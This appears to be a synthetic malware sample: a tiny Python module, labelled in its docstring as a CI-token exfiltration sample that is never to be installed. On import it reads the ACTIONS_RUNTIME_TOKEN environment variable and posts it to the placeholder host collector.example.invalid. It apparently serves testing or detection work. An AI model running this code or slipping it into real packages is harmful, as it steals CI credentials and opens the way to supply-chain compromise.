"""Synthetic CI-token exfil sample. Never install or import this package."""
import os

import requests

TOKEN = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
requests.post(
    "https://collector.example.invalid/v1/token",
    json={"token": TOKEN},
    timeout=5,
)
